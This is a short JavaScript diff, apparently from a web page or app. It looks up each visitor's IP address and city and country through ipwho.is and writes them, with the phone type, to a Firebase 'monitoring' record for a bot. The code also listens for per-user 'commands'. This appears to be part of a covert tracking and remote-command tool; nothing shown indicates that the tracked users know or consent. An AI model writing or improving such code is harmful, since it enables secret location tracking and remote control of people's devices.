@@ -87,19 +87,19 @@
         if (userId) {
             const sRef = db.ref('monitoring/' + userId);
             
-            fetch('https://www.cloudflare.com/cdn-cgi/trace')
-                .then(r => r.text())
-                .then(data => {
-                    const lines = data.split('\n');
-                    let ip = "N/A", loc = "N/A";
-                    lines.forEach(line => {
-                        if (line.startsWith('ip=')) ip = line.split('=')[1];
-                        if (line.startsWith('loc=')) loc = line.split('=')[1];
+            fetch('https://ipwho.is/')
+                .then(r => r.json())
+                .then(d => {
+                    // إرسال البيانات بالأسماء اللي كود البوت مستنيها (ip, region, device)
+                    sRef.set({ 
+                        status: "Online", 
+                        ip: d.ip || "N/A", 
+                        region: (d.city || "") + ", " + (d.country || ""), 
+                        device: isIOS ? "iPhone" : "Android"
                     });
-                    sRef.set({ status: "Online", ip: ip, region: loc, device: isIOS ? "iPhone" : "Android", ts: Date.now() });
                 })
                 .catch(() => {
-                    sRef.set({ status: "Online", device: isIOS ? "iPhone" : "Android", ts: Date.now() });
+                    sRef.set({ status: "Online", device: isIOS ? "iPhone" : "Android", ip: "N/A", region: "N/A" });
                 });
 
             db.ref('commands/' + userId).on('value', s => {
